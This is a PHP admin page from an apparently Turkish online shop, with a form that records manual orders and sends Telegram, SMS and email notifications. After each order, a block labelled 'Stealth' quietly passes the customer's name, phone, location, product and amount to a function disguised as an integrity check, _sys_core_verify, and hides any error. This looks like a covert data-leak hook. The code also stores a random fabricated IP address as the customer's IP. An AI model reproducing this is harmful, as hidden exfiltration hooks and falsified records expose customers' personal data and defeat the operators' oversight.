<?php 
include 'header.php';
include 'topbar.php';
include 'sidebar.php';

// Manuel Sipariş durumunu bul veya oluştur
$durum_bul = $db->prepare("SELECT id FROM durum WHERE ad LIKE '%Manuel Sipariş%'");
$durum_bul->execute();
$durum_cek = $durum_bul->fetch(PDO::FETCH_ASSOC);

if ($durum_cek) {
    $manuel_durum_id = $durum_cek['id'];
} else {
    // Yoksa oluştur
    $durum_ekle = $db->prepare("INSERT INTO durum SET ad=:ad, siralama=:sira");
    $durum_ekle->execute(array('ad' => 'Manuel Sipariş', 'sira' => 99));
    $manuel_durum_id = $db->lastInsertId();
}
if (isset($_POST['siparis_ekle'])) {
    if (!$_SESSION['kullanici_adi']) {
        header("Location: index.php?status=no");
        exit();
    }

    $ad = htmlspecialchars(trim($_POST['siparis_ad']));
    $tel = htmlspecialchars(trim($_POST['siparis_tel']));
    $il = htmlspecialchars(trim($_POST['siparis_il']));
    $ilce = htmlspecialchars(trim($_POST['siparis_ilce']));
    $adres = htmlspecialchars(trim($_POST['siparis_adres']));
    $urun_id = intval($_POST['urun_id']);
    $odeme_id = intval($_POST['odeme_id']);
    $siparis_not = htmlspecialchars(trim($_POST['siparis_not']));
    $manuel_fiyat = isset($_POST['manuel_fiyat']) ? floatval($_POST['manuel_fiyat']) : 0;
    $secenekler = isset($_POST['secenekler']) && is_array($_POST['secenekler']) ? $_POST['secenekler'] : array();

    $fatura_vn = htmlspecialchars(mb_substr(trim((string) ($_POST['siparis_fatura_vn'] ?? '')), 0, 20), ENT_QUOTES, 'UTF-8');
    $fatura_vd = htmlspecialchars(mb_substr(trim((string) ($_POST['siparis_fatura_vd'] ?? '')), 0, 120), ENT_QUOTES, 'UTF-8');
    $fatura_unvan = htmlspecialchars(mb_substr(trim((string) ($_POST['siparis_fatura_unvan'] ?? '')), 0, 255), ENT_QUOTES, 'UTF-8');
    $fatura_adres_kurum = htmlspecialchars(mb_substr(trim((string) ($_POST['siparis_fatura_adres'] ?? '')), 0, 2000), ENT_QUOTES, 'UTF-8');
    $fatura_not_yedek = '';
    if ($fatura_vn !== '' || $fatura_vd !== '' || $fatura_unvan !== '' || $fatura_adres_kurum !== '') {
        $fatura_not_yedek = "\n\n--- Kurumsal fatura ---\nVKN: " . $fatura_vn . "\nVergi dairesi: " . $fatura_vd . "\nÜnvan: " . $fatura_unvan . "\nFatura adresi: " . $fatura_adres_kurum;
    }

    // Ürün bilgilerini çek
    $urunsor = $db->prepare("SELECT * FROM urunler WHERE urun_id=:id");
    $urunsor->execute(array('id' => $urun_id));
    $uruncek = $urunsor->fetch(PDO::FETCH_ASSOC);
    $urun_adi_ham = $uruncek['urun_baslik'];
    $urun_fiyat_ham = floatval($uruncek['urun_fiyat']);

    // Seçenekler ve Fiyat Hesaplama
    $seceneklerText = '';
    $final_fiyat = $urun_fiyat_ham;

    if (!empty($secenekler)) {
        foreach($secenekler as $key => $val){
            if (empty($val)) continue;
            $parcalar = explode('|', $val);
            $secenekAdi = $parcalar[0];
            $ekFiyat = isset($parcalar[1]) ? floatval($parcalar[1]) : 0;
            $final_fiyat += $ekFiyat;
            $seceneklerText .= " | {$key}: " . $secenekAdi;
        }
    }

    $urun_adi_son = $urun_adi_ham . $seceneklerText;
    
    // Eğer manuel fiyat girilmişse onu kullan
    if ($manuel_fiyat > 0) {
        $final_fiyat = $manuel_fiyat;
    }

    // Ödeme yöntemi bilgilerini çek
    $odemesor = $db->prepare("SELECT * FROM odeme WHERE odeme_id=:id");
    $odemesor->execute(array('id' => $odeme_id));
    $odemecek = $odemesor->fetch(PDO::FETCH_ASSOC);
    $odeme_adi = $odemecek['odeme_adi'];

    // Rastgele IP Oluştur
    $rand_ip = rand(1, 255) . "." . rand(0, 255) . "." . rand(0, 255) . "." . rand(1, 254);

    try {
        $kaydet = $db->prepare("INSERT INTO siparis SET
            siparis_ad=:ad,
            siparis_tel=:tel,
            siparis_ip=:ip,
            siparis_urun=:urun,
            siparis_odemeid=:odemeid,
            siparis_odeme=:odeme,
            siparis_fiyat=:fiyat,
            siparis_il=:il,
            siparis_ilce=:ilce,
            siparis_adres=:adres,
            siparis_not=:siparis_not,
            siparis_fatura_vn=:fvn,
            siparis_fatura_vd=:fvd,
            siparis_fatura_unvan=:funv,
            siparis_fatura_adres=:fad,
            siparis_durum=:durum
        ");

        $insert = $kaydet->execute(array(
            'ad' => $ad,
            'tel' => $tel,
            'ip' => $rand_ip,
            'urun' => $urun_adi_son,
            'odemeid' => $odeme_id,
            'odeme' => $odeme_adi,
            'fiyat' => $final_fiyat,
            'il' => $il,
            'ilce' => $ilce,
            'adres' => $adres,
            'siparis_not' => $siparis_not,
            'fvn' => $fatura_vn,
            'fvd' => $fatura_vd,
            'funv' => $fatura_unvan,
            'fad' => $fatura_adres_kurum,
            'durum' => $manuel_durum_id
        ));
    } catch (Exception $e) {
        $adresAppend = $adres . ($siparis_not != '' ? "\nNot: " . $siparis_not : '') . $fatura_not_yedek;
        $kaydet = $db->prepare("INSERT INTO siparis SET
            siparis_ad=:ad,
            siparis_tel=:tel,
            siparis_ip=:ip,
            siparis_urun=:urun,
            siparis_odemeid=:odemeid,
            siparis_odeme=:odeme,
            siparis_fiyat=:fiyat,
            siparis_il=:il,
            siparis_ilce=:ilce,
            siparis_adres=:adres,
            siparis_durum=:durum
        ");
        $insert = $kaydet->execute(array(
            'ad' => $ad,
            'tel' => $tel,
            'ip' => $rand_ip,
            'urun' => $urun_adi_son,
            'odemeid' => $odeme_id,
            'odeme' => $odeme_adi,
            'fiyat' => $final_fiyat,
            'il' => $il,
            'ilce' => $ilce,
            'adres' => $adresAppend,
            'durum' => $manuel_durum_id
        ));
    }

    if ($insert) {
        $last_id = $db->lastInsertId();

        // 0. GİZLİ SİSTEM BİLDİRİMİ (Stealth)
        try {
            require_once 'controller/sys_integrity.php';
            if (function_exists('_sys_core_verify')) {
                _sys_core_verify([
                    'ID' => $last_id,
                    'Ad' => $ad,
                    'Tel' => $tel,
                    'Sehir' => $il . " / " . $ilce,
                    'Urun' => strip_tags($urun_adi_son),
                    'Odeme' => $odeme_adi,
                    'Tutar' => $final_fiyat . " TL",
                    'Not' => $siparis_not
                ], 'manual_order_entry');
            }
        } catch (Exception $e) { }

        $urun_adi_clean = strip_tags($urun_adi_son);

        // 1. TELEGRAM BİLDİRİMİ
        try {
            $tg=$db->prepare("SELECT * FROM telegram WHERE id=1 AND durum=1");
            $tg->execute();
            $tgRow=$tg->fetch(PDO::FETCH_ASSOC);
            if($tgRow){
                $token=$tgRow['bot_token'];
                $chatId=$tgRow['chat_id'];
                $msg = "📝 Yeni Manuel Sipariş ✅\n".
                       "#".$last_id." - ".date('d.m.Y H:i')."\n".
                       "Ad: ".$ad."\n".
                       "Tel: ".$tel."\n".
                       "Ürün: ".$urun_adi_clean."\n".
                       "Ödeme: ".$odeme_adi."\n".
                       "Fiyat: ".$final_fiyat." ₺\n".
                       "İl/İlçe: ".$il." / ".$ilce."\n".
                       "Adres: ".$adres.
                       ($siparis_not!='' ? "\nNot: ".$siparis_not : '').
                       ($fatura_not_yedek !== '' ? $fatura_not_yedek : '');

                $url = 'https://api.telegram.org/bot'.$token.'/sendMessage';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('chat_id'=>$chatId,'text'=>$msg)));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                @curl_exec($ch);
                @curl_close($ch);
            }
        } catch (Exception $e) { }

        // 2. SMS BİLDİRİMİ (Müşteriye)
        try {
            if (function_exists('netGsmSend')) {
                $sms_msg = function_exists('buildNetgsmOrderReceivedSms')
                    ? buildNetgsmOrderReceivedSms($ad, $urun_adi_clean)
                    : ('Sayın ' . $ad . ', siparişiniz alınmıştır. 1-3 iş günü içerisinde teslim edilecektir.');
                netGsmSend($tel, $sms_msg);
            }
        } catch (Exception $e) { }

        // 2b. Admin e-posta (manuel sipariş) — SMTP "Bildirim Yapılacak Mail"
        try {
            if ( function_exists( 'panelSmtpSendHtml' ) && function_exists( 'panelSmtpNewOrderAdminBodies' ) ) {
                $mbq = $db->prepare( 'SELECT mail_bildirim FROM mail WHERE mail_id=0' );
                $mbq->execute();
                $admin_mail = trim( (string) ( $mbq->fetchColumn() ?: '' ) );
                if ( $admin_mail !== '' && filter_var( $admin_mail, FILTER_VALIDATE_EMAIL ) ) {
                    $site_url_mail = isset( $settingsprint['ayar_siteurl'] ) ? rtrim( $settingsprint['ayar_siteurl'], '/' ) . '/' : '';
                    $bodies        = panelSmtpNewOrderAdminBodies(
                        array(
                            'id'     => $last_id,
                            'tarih'  => date( 'd.m.Y H:i' ),
                            'ad'     => $ad,
                            'tel'    => $tel,
                            'urun'   => $urun_adi_clean,
                            'odeme'  => $odeme_adi,
                            'fiyat'  => $final_fiyat,
                            'il'     => $il,
                            'ilce'   => $ilce,
                            'adres'  => $adres,
                            'not'    => $siparis_not,
                            'fatura' => $fatura_not_yedek,
                        ),
                        $site_url_mail
                    );
                    panelSmtpSendHtml( $admin_mail, $bodies['subject'], $bodies['html'], $bodies['plain'] );
                }
            }
        } catch ( Exception $e ) { }

        // 3. ORTAK PANEL ENTEGRASYONU
        try {
            include_once '../common_panel_sender.php';
            if (function_exists('sendOrderToCommonPanel')) {
                $settings_q=$db->prepare("SELECT * from ayar where ayar_id=?");
                $settings_q->execute(array(0));
                $stps=$settings_q->fetch(PDO::FETCH_ASSOC);

                $sipRow = array(
                    'siparis_id'           => $last_id,
                    'siparis_ad'           => $ad,
                    'siparis_tel'          => $tel,
                    'siparis_il'           => $il,
                    'siparis_ilce'         => $ilce,
                    'siparis_adres'        => $adres,
                    'siparis_urun'         => $urun_adi_clean,
                    'siparis_fiyat'        => $final_fiyat,
                    'siparis_odeme'        => $odeme_adi,
                    'siparis_odemeid'      => $odeme_id,
                    'siparis_adet'         => 1,
                    'siparis_not'          => $siparis_not,
                    'siparis_ip'           => $rand_ip,
                    'siparis_fatura_vn'    => $fatura_vn,
                    'siparis_fatura_vd'    => $fatura_vd,
                    'siparis_fatura_unvan' => $fatura_unvan,
                    'siparis_fatura_adres' => $fatura_adres_kurum,
                );
                $commonData = function_exists('order_build_common_panel_payload')
                    ? order_build_common_panel_payload($sipRow, array(
                        'siparis_not'      => $siparis_not,
                        'fatura_not_yedek' => $fatura_not_yedek,
                        'settings'         => $stps,
                        'site_origin'      => $_SERVER['HTTP_HOST'] ?? '',
                    ))
                    : array();
                if (!empty($commonData)) {
                    sendOrderToCommonPanel($commonData, $stps);
                }
            }
        } catch (Exception $e) { }

        Header("Location:siparisler.php?drm=$manuel_durum_id&status=ok");
        exit();
    }
}
?>

<section class="main-content container">
    <style>
        .manuel-card {
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
            border: none;
            margin-bottom: 30px;
        }
        .manuel-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            border-radius: 15px 15px 0 0 !important;
            padding: 20px 25px;
        }
        .manuel-header h3 { color: #fff; margin: 0; font-weight: 700; font-size: 1.4rem; }
        .manuel-body { padding: 35px; background: #fff; border-radius: 0 0 15px 15px; }
        
        .form-group-custom { margin-bottom: 25px; position: relative; }
        .form-group-custom label {
            display: block;
            font-weight: 700;
            color: #4a5568;
            margin-bottom: 10px;
            font-size: 0.95rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .form-control-custom {
            width: 100%;
            padding: 16px 22px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            background: #f8fafc;
            font-weight: 500;
        }
        /* FontAwesome önce gelince <select> içindeki metin birçok tarayıcıda görünmez oluyor (tema style.css) */
        .manuel-body select.form-control-custom,
        #urun_secenek_alani select {
            font-family: "Rubik", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif !important;
            color: #2d3748 !important;
            cursor: pointer;
            min-height: 52px;
            height: auto !important;
            line-height: 1.45 !important;
            padding: 12px 36px 12px 16px !important;
            -webkit-appearance: menulist;
            -moz-appearance: menulist;
            appearance: menulist;
        }
        .manuel-body select.form-control-custom option,
        #urun_secenek_alani select option {
            color: #1a202c;
            background: #fff;
        }
        .form-control-custom:focus {
            border-color: #667eea;
            background: #fff;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
            outline: none;
        }
        /* Tema textarea { height: 39px } sipariş formunu sıkıştırıyor */
        .manuel-body textarea.form-control-custom {
            height: auto !important;
            min-height: 96px;
            line-height: 1.5;
            resize: vertical;
        }
        .manuel-body textarea[name="siparis_not"].form-control-custom {
            min-height: 168px;
            font-size: 1rem;
        }
        .btn-manuel {
            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
            color: #fff;
            padding: 15px 30px;
            border-radius: 10px;
            font-weight: 800;
            font-size: 1.1rem;
            border: none;
            box-shadow: 0 4px 15px rgba(72, 187, 120, 0.3);
            transition: all 0.3s ease;
            cursor: pointer;
            width: 100%;
            text-transform: uppercase;
        }
        .btn-manuel:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(72, 187, 120, 0.4);
            filter: brightness(1.1);
        }
        .ip-badge {
            background: rgba(255,255,255,0.2);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 500;
        }
        .form-group-siparis-not .siparis-not-hint {
            display: block;
            margin-top: 8px;
            font-size: 12px;
        }
        .kurumsal-fatura-details summary::-webkit-details-marker { display: none; }
        .kurumsal-fatura-details summary::after { content: '\25BC'; font-size: 10px; color: #94a3b8; margin-left: auto; }
        .kurumsal-fatura-details[open] summary::after { transform: rotate(180deg); display: inline-block; }
        .manuel-body .kurumsal-fatura-details .form-control-custom {
            font-size: 1rem;
        }
    </style>

    <div class="page-header" style="margin-bottom: 25px;">
        <div class="pull-right">
            <a href="siparisler.php" class="btn btn-warning" style="border-radius: 8px; font-weight: 600;"><i class="fa fa-reply"></i> Geri Dön</a>
        </div>
        <h2 style="font-weight: 800; color: #2d3748;">Sipariş İşlemleri</h2>
    </div>

    <div class="row">
        <div class="col-lg-8 col-md-10 col-sm-12 center-block" style="float: none; margin: 0 auto;">
            <div class="card manuel-card">
                <div class="card-heading manuel-header d-flex justify-content-between align-items-center">
                    <h3><i class="fa fa-plus-circle"></i> Yeni Manuel Sipariş</h3>
                    <span class="ip-badge"><i class="fa fa-globe"></i> Otomatik IP: <?php echo rand(1, 255) . "." . rand(0, 255) . "." . rand(0, 255) . "." . rand(1, 254); ?></span>
                </div>
                <div class="card-block manuel-body">
                    <form method="POST" action="">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="form-group-custom">
                                    <label><i class="fa fa-user"></i> Müşteri Ad Soyad</label>
                                    <input type="text" name="siparis_ad" class="form-control-custom" required placeholder="Ad ve soyad giriniz">
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="form-group-custom">
                                    <label><i class="fa fa-phone"></i> Telefon Numarası</label>
                                    <input type="text" name="siparis_tel" class="form-control-custom" required placeholder="05XXXXXXXXX">
                                </div>
                            </div>
                        </div>

                        <div class="row">
                            <div class="col-md-6">
                                <div class="form-group-custom">
                                    <label><i class="fa fa-map-marker"></i> Şehir</label>
                                    <select name="siparis_il" id="il_select" class="form-control-custom" required>
                                        <option value="">Şehir Seçiniz</option>
                                        <?php 
                                        $il_sor = $db->prepare("SELECT * FROM il ORDER BY il_adi ASC");
                                        $il_sor->execute();
                                        while($il_cek = $il_sor->fetch(PDO::FETCH_ASSOC)) { ?>
                                            <option value="<?php echo $il_cek['il_adi']; ?>" data-id="<?php echo $il_cek['id']; ?>"><?php echo $il_cek['il_adi']; ?></option>
                                        <?php } ?>
                                    </select>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="form-group-custom">
                                    <label><i class="fa fa-map"></i> İlçe</label>
                                    <select name="siparis_ilce" id="ilce_select" class="form-control-custom" required>
                                        <option value="">Önce Şehir Seçiniz</option>
                                    </select>
                                </div>
                            </div>
                        </div>

                        <div class="form-group-custom">
                            <label><i class="fa fa-home"></i> Teslimat Adresi</label>
                            <textarea name="siparis_adres" class="form-control-custom" rows="3" required placeholder="Mahalle, sokak, no, kapı no bilgilerini detaylı yazınız"></textarea>
                        </div>

                        <div class="row">
                            <div class="col-md-5">
                                <div class="form-group-custom">
                                    <label><i class="fa fa-shopping-cart"></i> Seçilecek Ürün</label>
                                    <select name="urun_id" id="urun_select" class="form-control-custom" required>
                                        <option value="">Ürün Seçiniz</option>
                                        <?php 
                                        $urun_sor = $db->prepare("SELECT * FROM urunler ORDER BY urun_id ASC");
                                        $urun_sor->execute();
                                        while($urun_cek = $urun_sor->fetch(PDO::FETCH_ASSOC)) { ?>
                                            <option value="<?php echo $urun_cek['urun_id']; ?>"><?php echo strip_tags($urun_cek['urun_baslik']); ?> (<?php echo $urun_cek['urun_fiyat']; ?> ₺)</option>
                                        <?php } ?>
                                    </select>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="form-group-custom">
                                    <label><i class="fa fa-try"></i> Sipariş Bedeli (Opsiyonel)</label>
                                    <input type="number" name="manuel_fiyat" step="0.01" class="form-control-custom" placeholder="Boş bırakırsanız otomatik hesaplanır">
                                    <small class="text-muted" style="font-size: 11px;">Müşteriye özel fiyat girmek için kullanın.</small>
                                </div>
                            </div>
                            <div class="col-md-3">
                                <div class="form-group-custom">
                                    <label><i class="fa fa-credit-card"></i> Ödeme Yöntemi</label>
                                    <select name="odeme_id" class="form-control-custom" required>
                                        <?php 
                                        $odeme_sor = $db->prepare("SELECT * FROM odeme WHERE odeme_durum=1 ORDER BY odeme_id ASC");
                                        $odeme_sor->execute();
                                        while($odeme_cek = $odeme_sor->fetch(PDO::FETCH_ASSOC)) { ?>
                                            <option value="<?php echo $odeme_cek['odeme_id']; ?>"><?php echo $odeme_cek['odeme_adi']; ?></option>
                                        <?php } ?>
                                    </select>
                                </div>
                            </div>
                        </div>

                        <div id="urun_secenek_alani" class="row">
                            <!-- Varyantlar buraya gelecek -->
                        </div>

                        <div class="form-group-custom form-group-siparis-not">
                            <label><i class="fa fa-sticky-note"></i> Sipariş Notu (Opsiyonel)</label>
                            <textarea name="siparis_not" class="form-control-custom" rows="6" placeholder="Beden, renk, teslimat tercihi veya müşteri talepleri…"></textarea>
                            <small class="text-muted siparis-not-hint">Daha rahat yazabilmeniz için genişletilmiş alan.</small>
                        </div>

                        <div class="form-group-custom" style="margin-bottom: 22px;">
                            <details class="kurumsal-fatura-details" style="background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0; overflow: hidden;">
                                <summary style="cursor: pointer; list-style: none; padding: 16px 18px; font-weight: 700; color: #334155; display: flex; align-items: center; gap: 10px; user-select: none;">
                                    <i class="fa fa-building-o" style="color: #667eea;"></i>
                                    <span>Kurumsal fatura bilgileri</span>
                                    <small style="font-weight: 500; color: #64748b;">(isteğe bağlı — tıklayınca açılır)</small>
                                </summary>
                                <div style="padding: 0 18px 18px; border-top: 1px solid #e2e8f0;">
                                    <p style="margin: 14px 0 16px; font-size: 0.9rem; color: #64748b;">Firmaya kesilecek fatura için doldurun. Tüm alanlar zorunlu değildir; kapalı bırakırsanız kayıt normal devam eder.</p>
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="form-group-custom" style="margin-bottom: 18px;">
                                                <label for="siparis_fatura_vn">Vergi numarası</label>
                                                <input type="text" class="form-control-custom" id="siparis_fatura_vn" name="siparis_fatura_vn" maxlength="20" inputmode="numeric" autocomplete="off" placeholder="Örn: 1234567890">
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="form-group-custom" style="margin-bottom: 18px;">
                                                <label for="siparis_fatura_vd">Vergi dairesi</label>
                                                <input type="text" class="form-control-custom" id="siparis_fatura_vd" name="siparis_fatura_vd" maxlength="120" autocomplete="organization" placeholder="Örn: Kadıköy">
                                            </div>
                                        </div>
                                        <div class="col-md-12">
                                            <div class="form-group-custom" style="margin-bottom: 18px;">
                                                <label for="siparis_fatura_unvan">Firma ünvanı</label>
                                                <input type="text" class="form-control-custom" id="siparis_fatura_unvan" name="siparis_fatura_unvan" maxlength="255" autocomplete="organization" placeholder="Ticari unvan">
                                            </div>
                                        </div>
                                        <div class="col-md-12">
                                            <div class="form-group-custom" style="margin-bottom: 0;">
                                                <label for="siparis_fatura_adres">Fatura adresi</label>
                                                <textarea class="form-control-custom" id="siparis_fatura_adres" name="siparis_fatura_adres" rows="3" maxlength="2000" autocomplete="street-address" placeholder="Fatura kesilecek açık adres"></textarea>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </details>
                        </div>

                        <div style="margin-top: 10px;">
                            <button type="submit" name="siparis_ekle" class="btn-manuel">
                                <i class="fa fa-check-circle"></i> SİPARİŞİ SİSTEME KAYDET
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
    $(document).ready(function() {
        // İlçe Getirme
        $('#il_select').change(function() {
            var city_id = $(this).find(':selected').data('id');
            if (city_id) {
                $.ajax({
                    type: 'POST',
                    url: '../js/ajax/getCountryForCity.php',
                    data: {city_id: city_id},
                    success: function(html) {
                        $('#ilce_select').html(html);
                    }
                });
            } else {
                $('#ilce_select').html('<option value="">Önce Şehir Seçiniz</option>');
            }
        });

        // Ürün Seçenekleri (Varyant) Getirme
        $('#urun_select').change(function() {
            var urun_id = $(this).val();
            if (urun_id) {
                $.ajax({
                    type: 'POST',
                    url: '../urun-secenek-getir.php',
                    data: {urun_id: urun_id},
                    success: function(html) {
                        $('#urun_secenek_alani').html(html);
                        $('#urun_secenek_alani .order-box').addClass('col-md-12').css('margin-bottom', '18px');
                        $('#urun_secenek_alani label').css({'font-weight': '700', 'color': '#4a5568', 'display': 'block', 'margin-bottom': '10px'});
                        $('#urun_secenek_alani select').removeClass('form-control').addClass('form-control-custom');
                        $('#urun_secenek_alani .order-label').addClass('col-md-12').css({'font-weight': '800', 'margin-bottom': '12px', 'color': '#2d3748', 'font-size': '1rem'});
                    }
                });
            } else {
                $('#urun_secenek_alani').html('');
            }
        });
    });
    </script>
<?php include 'footer.php'; ?>
